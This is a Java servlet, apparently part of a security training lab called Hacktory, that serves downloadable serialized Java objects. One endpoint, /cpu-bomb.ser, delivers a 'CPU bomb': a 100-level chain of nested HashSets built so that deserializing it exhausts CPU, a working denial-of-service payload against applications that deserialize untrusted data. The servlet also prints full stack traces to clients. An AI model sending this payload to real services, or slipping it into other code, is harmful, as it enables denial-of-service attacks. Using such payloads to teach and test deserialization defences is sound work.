import java.io.*;
import java.util.*;
import javax.servlet.*;
import javax.servlet.http.*;

public class Hacktory extends HttpServlet {

   public void doGet(HttpServletRequest request, HttpServletResponse response)
                     throws ServletException, IOException {

      String path = request.getPathInfo() == null ? "" : request.getPathInfo();

      try {
         switch (path) {
            case "/string.ser":
               serializeAnything(new String("this is a joke"),
                                 response, "string.ser");
               break;
            case "/cpu-bomb.ser":
               serializeAnything(CPUbomb(),
                                 response, "cpu-bomb.ser");
               break;
            default:
               request.getRequestDispatcher("/WEB-INF/hacktory.jsp").forward(request, response);
         }
      } catch (Exception e) {
         PrintWriter out = response.getWriter();
         response.setContentType("text/plain");
         e.printStackTrace(out);
      }
   }

   private void serializeAnything(Object obj, HttpServletResponse response, String fname)
                                  throws IOException {
      response.setContentType("application/x-binary");
      response.setHeader("Content-Disposition", "attachment; filename=" + fname);

      OutputStream rout       = response.getOutputStream();
      ObjectOutputStream oout = new ObjectOutputStream(rout);
      oout.writeObject(obj);   // serialization
      oout.close();
      rout.close();
   }

   @SuppressWarnings("unchecked")
   static Object CPUbomb() {
    Set root = new HashSet();
    Set s1 = root;
    Set s2 = new HashSet();
    for (int i = 0; i < 100; i++) {
       Set t1 = new HashSet();
       Set t2 = new HashSet();
       t1.add("foo");
       s1.add(t1);
       s1.add(t2);
       s2.add(t1);
       s2.add(t2);
       s1 = t1;
       s2 = t2;
    }
    return (Object) root;
   }

}
